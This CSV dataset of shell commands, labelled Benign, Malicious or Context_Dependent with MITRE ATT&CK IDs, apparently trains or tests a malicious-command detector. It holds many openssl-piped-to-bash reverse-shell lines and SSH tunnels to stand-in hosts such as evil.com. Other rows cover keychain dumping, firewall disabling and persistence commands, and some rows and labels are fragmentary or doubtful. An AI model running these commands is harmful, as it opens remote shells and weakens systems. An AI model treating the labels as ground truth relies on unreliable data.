command,label,original_label,mitre_id
openssl s_client -quiet -connect 172.16.0.10:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
dstat [-c|--cpu] [-m|--mem],Benign,Benign,Benign
crackle -i path/to/input.pcap -o path/to/decrypted.pcap,Benign,Benign,Benign
argospm update,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:443,Malicious,Synthetic,Synthetic
phar info -f path/to/phar_file,Benign,Benign,Benign
security dump-keychain –d,Malicious,Malicious,T1555
enum4linux -o remote_host,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
nmake /N,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
ghostty +list-themes,Benign,Benign,Benign
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,Malicious,Malicious,T1127
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:4445,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:443 backup@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
uvcdynctrl [-g|--get] control_name,Benign,Benign,Benign
agg [-h|--help],Benign,Benign,Benign
e2image -Q /dev/sdXN path/to/image_file,Benign,Benign,Benign
"fd ""string|regex""",Benign,Benign,Benign
find . -print -name SCCS -prune,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:3389 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:80 root@10.0.0.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
ssh -R 8080:localhost:8888 root@172.16.0.25,Context_Dependent,Synthetic,Synthetic
taskset [-c|--cpu-list] cpu_id command,Benign,Benign,Benign
sudo nmap -A -iL path/to/file.txt,Benign,Benign,Benign
ppmtomitsu [-e|-enlarge] 1|2|3 [-s|-sharpness] 1|2|3|4 [-c|-copy] n path/to/file.ppm > path/to/file.mitsu,Benign,Benign,Benign
psexec \\remote_host -u user_name -p password,Benign,Benign,Benign
oci.dll,Malicious,Malicious,T1574
tesseract --help-psm,Benign,Benign,Benign
packwiz modrinth|curseforge export,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
encfs -f /path/to/cipher_directory /path/to/mount_point,Benign,Benign,Benign
ssh -R 8080:localhost:3389 backup@172.16.0.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
chsh -s $(which zsh),Benign,Benign,Benign
"copy ""$executable_binary"" ""\\?\C:\Windows \System32\mmc.exe""",Malicious,Malicious,T1548
join -1 2 -2 1 text.txt codes.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
sudo iftop -b,Benign,Benign,Benign
prowler azure [-c|--checks] storage_blob_public_access_level_is_disabled,Benign,Benign,Benign
ssh -R 8080:localhost:443 user@172.16.5.20,Context_Dependent,Synthetic,Synthetic
hangups -h,Benign,Benign,Benign
"echo ""flag2"" > $flagPath2",Malicious,Malicious,T1137
ssh -R 4444:localhost:6379 audit@internal.corp,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:445 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
exrex 'regex',Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
tldr pamtopng,Benign,Benign,Benign
rustup doc std::fs|usize|fn|...,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
find /dir/to/search/ -type f -name 'expression -and expression' -print,Benign,Benign,Benign
gatsby build,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.25:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:445,Malicious,Synthetic,Synthetic
security-checker security:check path/to/composer.lock,Benign,Benign,Benign
ssh -R 4444:localhost:8443 user@192.168.0.50,Context_Dependent,Synthetic,Synthetic
"flake8 --exclude substring1,glob2 path/to/file_or_directory",Benign,Benign,Benign
find . -exec echo {} +,Benign,Benign,Benign
ssh -R 8080:localhost:53 user@172.20.10.8,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
ssh -R 4444:localhost:22 admin@10.10.10.10,Context_Dependent,Synthetic,Synthetic
osv-scanner --json -D|-L|-S|-r target,Benign,Benign,Benign
"find . -name ""*bash*""",Benign,Benign,Benign
"find . –name ""*.txt"" –mtime 5",Benign,Benign,Benign
gdalinfo WMS:https://services.meggsimum.de/geoserver/ows,Benign,Benign,Benign
"read -p ""Are you sure you want to continue? <y/N> "" prompt",Benign,Benign,Benign
ssh -R 8080:localhost:8080 operator@cdn-sync.bad,Context_Dependent,Synthetic,Synthetic
isisdl --sync,Benign,Benign,Benign
ppmwheel diameter > path/to/output.ppm,Benign,Benign,Benign
"$ShortCut.Description = ""T1547.009."";",Malicious,Malicious,T1547
mklink /j path\to\link_file path\to\source_file,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
ss-local -s host -p server_port -l local port -k password -m encrypt_method,Context_Dependent,Benign,Benign
ssh -R 8080:localhost:80 svcuser@172.16.0.25,Context_Dependent,Synthetic,Synthetic
dune clean,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
"windows\syswow64,",Malicious,Malicious,T1053
otherchecks -noninteractive -consoleoutput,Context_Dependent,Malicious,T1082
ng [n|new] app_name [-g|--skip-git],Benign,Benign,Benign
valac --version,Benign,Benign,Benign
"zcat /var/log/fail2ban.log* | gawk '/.*Ban.*/ {print $7};' | sort | uniq -c | sort | gawk '{ ""geoiplookup "" $2 ""| cut -f2 -d: "" | getline geoip; print $2 ""\t\t"" $1 "" "" geoip}'",Benign,Benign,Benign
ssh -R 4444:localhost:22 operator@files.company.local,Context_Dependent,Synthetic,Synthetic
reg.py domain/username:password@target query -keyName 'HKLM\SOFTWARE\Microsoft\Windows' -s,Benign,Benign,Benign
yes n | rm -ir dir1 dir2 dir3,Benign,Benign,Benign
slurmd -N nodename,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
"find /path -type f -iname ""*.ext"" -printf ""%h\n""",Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:8080 svcuser@192.168.1.25,Context_Dependent,Synthetic,Synthetic
git stamp [-r|--replace] issue_number,Benign,Benign,Benign
ssh -R 8080:localhost:9001 jenkins@10.0.0.100,Context_Dependent,Synthetic,Synthetic
desc instance instance_id;,Benign,Benign,Benign
prompt,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:1433 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"getopt [-o|--options] vV [-l|--longoptions] verbose,version -- --version --verbose",Benign,Benign,Benign
nitch,Benign,Benign,Benign
gawk '{print $5}' path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:3389 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
sudo togglesebool key1 key2 ...,Benign,Benign,Benign
pssh [-i|--inline] [-h|--hosts] path/to/hosts_file [-p|-par] 10 'cd dir; ./script.sh; exit',Benign,Benign,Benign
sslscan example.com,Benign,Benign,Benign
ssh -L 8080:localhost:9001 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:6379 user@10.20.30.40,Context_Dependent,Synthetic,Synthetic
"elvish -c ""echo 'elvish is executed'""",Benign,Benign,Benign
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f",Malicious,Malicious,T1562
subst,Benign,Benign,Benign
ssh -R 4444:localhost:22 jenkins@example.com,Context_Dependent,Synthetic,Synthetic
choose [-x|--exclusive] :2,Benign,Benign,Benign
pdfdetach list -enc UTF-8 path/to/input.pdf,Benign,Benign,Benign
lvmpolld [-p|--pidfile] /tmp/lvmpolld.pid,Benign,Benign,Benign
yes | cat | more,Benign,Benign,Benign
chmod u+rw path/to/file_or_directory,Benign,Benign,Benign
trafilatura [-h|--help],Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"find . -name ""FILE-TO-FIND"" -exec rm -rf {} \;",Benign,Benign,Benign
ssh -L 8080:localhost:8080 admin@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
b2 ls bucket_name,Benign,Benign,Benign
wtype -m ctrl,Benign,Benign,Benign
ssh -L 8080:localhost:8443 admin@staging.lab,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:110 audit@evil.com,Context_Dependent,Synthetic,Synthetic
pest --parallel,Benign,Benign,Benign
"kdeconnect-cli --ring --name ""device_name""",Benign,Benign,Benign
chgrp -R apache_user files,Benign,Benign,Benign
ssh -R 8080:localhost:9090 operator@internal.corp,Context_Dependent,Synthetic,Synthetic
qpdf --empty --pages path/to/file1.pdf file2.pdf ... -- path/to/output.pdf,Benign,Benign,Benign
wlsunset -g gamma_value,Benign,Benign,Benign
"sudo sed -i ""$indexs,^,$pam_rule\n,g"" $path_to_pam_conf",Malicious,Malicious,T1556
openssl s_client -quiet -connect 192.168.0.50:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:22,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.5.20:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
pg_verifybackup [-e|--exit-on-error] path/to/backup,Benign,Benign,Benign
tldr bun pm ls,Benign,Benign,Benign
ssh -L 8080:localhost:8888 svcuser@evil.com,Context_Dependent,Synthetic,Synthetic
abrt-cli report [-a|--analyze] problem_id,Benign,Benign,Benign
Update.exe --download {REMOTEURL},Malicious,Malicious,T1218
ssh -R 8080:localhost:9090 audit@10.0.0.10,Context_Dependent,Synthetic,Synthetic
dua --threads count,Benign,Benign,Benign
systemd-nspawn [-D|--directory] path/to/container_root [-a|--as-pid2],Benign,Benign,Benign
picttoppm [-n|-noheader] [-quic|-quickdraw] path/to/file.pict > path/to/file.ppm,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
uuidgen,Benign,Benign,Benign
openssl s_client -quiet -connect 10.20.30.40:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.50:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
rector process path/to/directory --dry-run,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:3306 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
assimp export input_file.stl output_file.obj,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
zmv -v '(*).log' '$1.txt',Benign,Benign,Benign
"command | cut [-d|--delimiter] ""delimiter"" [-f|--fields] 2-",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:445 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:3306 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
chown `stat -c %U originalfile`:`stat -c %G originalfile` newfile,Benign,Benign,Benign
sudo dmidecode [-s|--string] bios-version,Benign,Benign,Benign
sudo smbpasswd -a username,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:445 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
aws lambda list-functions,Benign,Benign,Benign
ssh -R 4444:localhost:5432 svcuser@10.20.30.40,Context_Dependent,Synthetic,Synthetic
ssh -R 8080:localhost:3306 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:22 svcuser@10.10.10.25,Context_Dependent,Synthetic,Synthetic
pacdiff [-l|--locate],Benign,Benign,Benign
darwin-rebuild build --flake path/to/flake,Benign,Benign,Benign
pbzip2 [-d|--decompress] path/to/compressed_file.bz2,Benign,Benign,Benign
knock [-v|--verbose] hostname portnumber,Benign,Benign,Benign
caddy reverse-proxy --from :80 --to localhost:8000,Benign,Benign,Benign
k3d registry create registry_name,Benign,Benign,Benign
fly targets,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
touch index.html,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.50:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
procstat fds pid,Benign,Benign,Benign
airdecap-ng -e essid -p password path/to/capture.cap,Benign,Benign,Benign
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
tod task next,Benign,Benign,Benign
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run,Malicious,Malicious,T1060
git guilt [-e|--email],Benign,Benign,Benign
sudo repquota [-augs|--all --user --group --human-readable],Benign,Benign,Benign
pyinfra @local path/to/deploy.py,Benign,Benign,Benign
ssh -R 4444:localhost:3306 audit@10.10.10.50,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
snoop -V -i path/to/file,Benign,Benign,Benign
ssh -L 8080:localhost:5432 postgres@192.168.1.100,Context_Dependent,Synthetic,Synthetic
flask run,Benign,Benign,Benign
"find ./ -name ""*.sqlite""",Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:53,Malicious,Synthetic,Synthetic
"find dir -name '*.jpg' -exec ln -s ""{}"" \;",Benign,Benign,Benign
x11vnc -forever -viewonly,Benign,Benign,Benign
pyflakes checkPath path/to/directory,Benign,Benign,Benign
ssh -R 8080:localhost:3306 user@10.10.10.25,Context_Dependent,Synthetic,Synthetic
gcal --starting-day=1,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8888,Malicious,Synthetic,Synthetic
swaylock [-u|--no-unlock-indicator],Benign,Benign,Benign
pycodestyle --show-source file.py,Benign,Benign,Benign
arithmetic -o +|-|x|/,Benign,Benign,Benign
java.lang.Thread.sleep(50);,Malicious,Malicious,T1059
openssl s_client -quiet -connect 172.16.0.10:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
par2 verify -- path/to/file.par2,Benign,Benign,Benign
"find ""$sourceDir"" -type d | sed -e ""s?$sourceDir?$targetDir?"" | xargs mkdir -p",Benign,Benign,Benign
ahost -t a|aaaa|u example.com,Benign,Benign,Benign
git secret reveal,Benign,Benign,Benign
ssh -R 8080:localhost:80 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
lscpu [-e|--extended] [-c|--offline],Context_Dependent,Benign,Benign
"v4l2-ctl [-d|--device] path/to/video_device --set-fmt-video=width=width,height=height,pixelformat=MJPG --stream-mmap --stream-to=path/to/output.jpg --stream-count=1",Benign,Benign,Benign
